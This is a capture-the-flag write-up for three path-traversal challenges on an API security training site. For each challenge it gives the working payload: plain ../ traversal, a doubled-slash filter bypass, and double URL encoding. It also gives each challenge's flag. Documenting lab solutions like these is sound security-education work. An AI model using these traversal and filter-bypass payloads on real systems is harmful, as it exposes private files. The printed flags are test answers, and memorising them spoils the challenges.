## Slash and Dash

### Roads Less Traveled  

Designed By: Josh Cutting - Maltek Solutions  
Points: 50 Create Task

Ever feel like the web is hiding secrets just beneath the surface? You're right. This challenge drops you into a janky search API with a serious trust issue—it happily believes whatever path you feed it. Your objective: go off the beaten path, dodge the digital bouncers, and unearth the legendary `flag.txt` lurking in a **private** spot at the root of the filesystem. Pro tip: Sometimes, the way forward is actually up.. and back.

[https://roads-less-traveled.ac25.apisecuniversity.com](https://roads-less-traveled.ac25.apisecuniversity.com)

Solution:

Here there was no filter, just perform the path traversal.

```
../private/flag.txt
```

![](2025-05-24_15-29.png)

```json
flag{D1R_TR4V3RS4L_F1L3_4CC3SS}
```

### Filtered Fun  

Designed By: Josh Cutting - Maltek Solutions  
Points: 100 Create Task

Step into the shadows of the web with this entry-level exploit challenge from the underground. Our shady search API has a _tiny_ flaw… and you’re just the right mischief-maker to exploit it. Your mission: break out of the sandbox, sidestep the guards, and sneak a peek at the elusive `flag.txt` stashed in a **private** place at the root of the filesystem. Can you wiggle through the layers and unravel the filter’s tricks?

[https://filtered-fun.ac25.apisecuniversity.com](https://filtered-fun.ac25.apisecuniversity.com)

Solution:

Here it was enough to duplicate the slashes to bypass the filter.

```
....//private//flag.txt
```

![](2025-05-24_15-31.png)

```json
flag{F1LT3R_BYP4SS_D0T_D0T_SL4SH}
```

### Encoded Escapades  

Designed By: Josh Cutting - Maltek Solutions  
Points: 150 Create Task

The filesystem holds secrets—but this time, the path to truth is scrambled. You’ve found a quirky search API that’s a little too trusting and a little too encoded for its own good. Your objective: decode the madness, navigate through the layers of obfuscation, and uncover the **private** sacred relic known as `flag.txt`, hidden at the root of the system. Think traversal, but with a twist. Some breadcrumbs are plain text. Others? Not so much. Get ready to crack encodings, climb directories, and break the rules—one byte at a time.

[https://encoded-escapades.ac25.apisecuniversity.com](https://encoded-escapades.ac25.apisecuniversity.com)

Solution:

To bypass the filter here, it was necessary to double URL encode.

```
%252E%252E%252Fprivate%252Fflag%252Etxt
```

![](2025-05-24_15-33_1.png)

```json
flag{D0UBL3_3NC0D1NG_TR4V3R54L_M45T3R}
```
